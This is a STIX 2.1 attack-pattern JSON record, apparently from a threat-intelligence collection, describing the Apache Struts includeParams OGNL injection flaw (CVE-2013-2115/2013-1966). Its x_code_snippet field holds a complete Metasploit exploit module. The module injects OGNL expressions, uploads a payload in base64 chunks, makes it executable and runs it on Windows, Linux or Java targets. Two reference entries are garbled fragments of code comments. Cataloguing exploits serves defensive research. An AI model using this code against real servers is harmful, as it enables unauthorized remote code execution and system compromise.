{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5ab87708-31e3-4bc0-86d7-dc3ce55bcc34",
    "created": "2024-08-14T17:10:51.259549Z",
    "modified": "2024-08-14T17:10:51.259554Z",
    "name": "Apache Struts includeParams Remote Code Execution",
    "description": " This module exploits a remote command execution vulnerability in Apache Struts versions < 2.3.14.2. A specifically crafted request parameter can be used to inject arbitrary OGNL code into the stack bypassing Struts and OGNL library protections. When targeting an action which requires interaction through GET, the payload should be split, taking into account the URI limits. In this case, if the rendered JSP has more than one point of injection, it could result in payload corruption. This should happen only when the payload is larger than the URI length. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/struts_include_params.rb",
            "external_id": "struts_include_params.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-2115"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-1966"
        },
        {
            "source_name": "reference",
            "url": "https://cwiki.apache.org/confluence/display/WW/S2-014"
        },
        {
            "source_name": "reference",
            "url": "http://struts.apache.org/development/2.x/docs/s2-013.html"
        },
        {
            "source_name": "chunk_length=2048-sub_from_chunk#Usingthemaxrequestlengthof2048forIIS",
            "external_id": "subtractallthe\"static\"URLitems."
        },
        {
            "source_name": "chunk_length=65535#Justsetthistoanarbitrarilylargevalue",
            "external_id": "asitsapostrequestwedontcareaboutthesizeoftheURLanymore."
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apache Struts includeParams Remote Code Execution',\n      'Description'    => %q{\n          This module exploits a remote command execution vulnerability in Apache Struts\n        versions < 2.3.14.2. A specifically crafted request parameter can be used to inject\n        arbitrary OGNL code into the stack bypassing Struts and OGNL library protections.\n        When targeting an action which requires interaction through GET, the payload should\n        be split, taking into account the URI limits. In this case, if the rendered JSP has\n        more than one point of injection, it could result in payload corruption. This should\n        happen only when the payload is larger than the URI length.\n      },\n      'Author'         =>\n        [\n          # This vulnerability was also discovered by unknown members of:\n          #    'Coverity security Research Laboratory'\n          #    'NSFOCUS Security Team'\n          'Eric Kobrin', # Vulnerability Discovery\n          'Douglas Rodrigues', # Vulnerability Discovery\n          'Richard Hicks <scriptmonkey.blog[at]gmail.com>' # Metasploit Module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2013-2115'],\n          [ 'CVE', '2013-1966'],\n          [ 'OSVDB', '93645'],\n          [ 'URL', 'https://cwiki.apache.org/confluence/display/WW/S2-014'],\n          [ 'URL', 'http://struts.apache.org/development/2.x/docs/s2-013.html']\n        ],\n      'Platform'      => %w{ java linux win },\n      'Privileged'     => true,\n      'Targets'        =>\n        [\n          ['Windows Universal',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win'\n            }\n          ],\n          ['Linux Universal',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux'\n            }\n          ],\n          [ 'Java Universal',\n            {\n              'Arch' => ARCH_JAVA,\n              'Platform' => 'java'\n            },\n          ]\n        ],\n      'DisclosureDate' => '2013-05-24',\n      'DefaultTarget' => 2))\n\n    register_options(\n      [\n        Opt::RPORT(8080),\n        OptString.new('PARAMETER',[ true, 'The parameter to use for the exploit (does not have to be an expected one).',rand_text_alpha_lower(4)]),\n        OptString.new('TARGETURI', [ true, 'The path to a vulnerable struts application action', \"/struts2-blank/example/HelloWorld.action\"]),\n        OptEnum.new('HTTPMETHOD', [ true, 'Which HTTP Method to use, GET or POST','POST', ['GET','POST']]),\n        OptInt.new('CHECK_SLEEPTIME', [ true, 'The time, in seconds, to ask the server to sleep while check', 5])\n      ])\n  end\n\n  def execute_command(cmd, opts = {})\n    inject_string = @inject.gsub(/CMD/,cmd)\n    uri = normalize_uri(target_uri.path)\n    req_hash = {'uri' => uri, 'version' => '1.1', 'method' => datastore['HTTPMETHOD'] }\n    case datastore['HTTPMETHOD']\n      when 'POST'\n        req_hash.merge!({ 'vars_post' => { datastore['PARAMETER'] => inject_string }})\n      when 'GET'\n        req_hash.merge!({ 'vars_get' => { datastore['PARAMETER'] => inject_string }})\n    end\n\n    # Display a nice \"progress bar\" instead of message spam\n    case @notify_flag\n    when 0\n      print_status(\"Performing HTTP #{datastore['HTTPMETHOD']} requests to upload payload\")\n      @notify_flag = 1\n    when 1\n      print(\".\") # Progress dots\n    when 2\n      print_status(\"Payload upload complete\")\n    end\n\n    return send_request_cgi(req_hash) #Used for check function.\n  end\n\n  def exploit\n    #initialise some base vars\n    @inject = \"${#_memberAccess[\\\"allowStaticMethodAccess\\\"]=true,CMD}\"\n    @java_upload_part_cmd = \"#f=new java.io.FileOutputStream('FILENAME',APPEND),#f.write(new sun.misc.BASE64Decoder().decodeBuffer('BUFFER')), #f.close()\"\n    #Set up generic values.\n    @payload_exe = rand_text_alphanumeric(4+rand(4))\n    pl_exe = generate_payload_exe\n    append = false\n    #Now arch specific...\n    case target['Platform']\n    when 'linux'\n      @payload_exe = \"/tmp/#{@payload_exe}\"\n      chmod_cmd = \"@java.lang.Runtime@getRuntime().exec(\\\"/bin/sh_-c_chmod +x #{@payload_exe}\\\".split(\\\"_\\\"))\"\n      exec_cmd = \"@java.lang.Runtime@getRuntime().exec(\\\"/bin/sh_-c_#{@payload_exe}\\\".split(\\\"_\\\"))\"\n    when 'java'\n      @payload_exe << \".jar\"\n      pl_exe = payload.encoded_jar.pack\n      exec_cmd = \"\"\n      exec_cmd << \"#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdkChecked'),\"\n      exec_cmd << \"#q.setAccessible(true),#q.set(null,true),\"\n      exec_cmd << \"#q=@java.lang.Class@forName('ognl.OgnlRuntime').getDeclaredField('_jdk15'),\"\n      exec_cmd << \"#q.setAccessible(true),#q.set(null,false),\"\n      exec_cmd << \"#cl=new java.net.URLClassLoader(new java.net.URL[]{new java.io.File('#{@payload_exe}').toURI().toURL()}),\"\n      exec_cmd << \"#c=#cl.loadClass('metasploit.Payload'),\"\n      exec_cmd << \"#c.getMethod('main',new java.lang.Class[]{@java.lang.Class@forName('[Ljava.lang.String;')}).invoke(\"\n      exec_cmd << \"null,new java.lang.Object[]{new java.lang.String[0]})\"\n    when 'win'\n      @payload_exe = \"./#{@payload_exe}.exe\"\n      exec_cmd = \"@java.lang.Runtime@getRuntime().exec('#{@payload_exe}')\"\n    else\n      fail_with(Failure::NoTarget, 'Unsupported target platform!')\n    end\n\n    print_status(\"Preparing payload...\")\n    # Now with all the arch specific stuff set, perform the upload.\n    # Need to calculate amount to allocate for non-dynamic parts of the URL.\n    # Fixed strings are tokens used for substitutions.\n    append_length = append ? \"true\".length : \"false\".length # Gets around the boolean/string issue\n    sub_from_chunk = append_length + ( @java_upload_part_cmd.length - \"FILENAME\".length - \"APPEND\".length - \"BUFFER\".length )\n    sub_from_chunk += ( @inject.length - \"CMD\".length ) + @payload_exe.length + normalize_uri(target_uri.path).length + datastore['PARAMETER'].length\n    case datastore['HTTPMETHOD']\n      when 'GET'\n        chunk_length = 2048 - sub_from_chunk # Using the max request length of 2048 for IIS, subtract all the \"static\" URL items.\n        #This lets us know the length remaining for our base64'd payloads\n        chunk_length = ((chunk_length/4).floor)*3\n      when 'POST'\n        chunk_length = 65535 # Just set this to an arbitrarily large value, as its a post request we don't care about the size of the URL anymore.\n    end\n    @notify_flag = 0\n    while pl_exe.length > chunk_length\n      java_upload_part(pl_exe[0,chunk_length],@payload_exe,append)\n      pl_exe = pl_exe[chunk_length,pl_exe.length - chunk_length]\n      append = true\n    end\n    java_upload_part(pl_exe,@payload_exe,append)\n    execute_command(chmod_cmd) if target['Platform'] == 'linux'\n    print_line() # new line character, after progress bar.\n    @notify_flag = 2 # upload is complete, next command we're going to execute the uploaded file.\n    execute_command(exec_cmd)\n    register_files_for_cleanup(@payload_exe)\n  end\n\n  def java_upload_part(part, filename, append = false)\n    cmd = @java_upload_part_cmd.gsub(/FILENAME/,filename)\n    append = append ? \"true\" : \"false\" # converted for the string replacement.\n    cmd = cmd.gsub!(/APPEND/,append)\n    cmd = cmd.gsub!(/BUFFER/,Rex::Text.encode_base64(part))\n    execute_command(cmd)\n  end\n\n  def check\n    #initialise some base vars\n    @inject = \"${#_memberAccess[\\\"allowStaticMethodAccess\\\"]=true,CMD}\"\n    vprint_status(\"Performing Check...\")\n    sleep_time = datastore['CHECK_SLEEPTIME']\n    check_cmd = \"@java.lang.Thread@sleep(#{sleep_time * 1000})\"\n    t1 = Time.now\n    vprint_status(\"Asking remote server to sleep for #{sleep_time} seconds\")\n    response = execute_command(check_cmd)\n    t2 = Time.now\n    delta = t2 - t1\n\n\n    if response.nil?\n      return Exploit::CheckCode::Safe\n    elsif delta < sleep_time\n      return Exploit::CheckCode::Safe\n    else\n      return Exploit::CheckCode::Vulnerable\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-05-24",
    "x_mitre_platforms": [
        "java"
    ]
}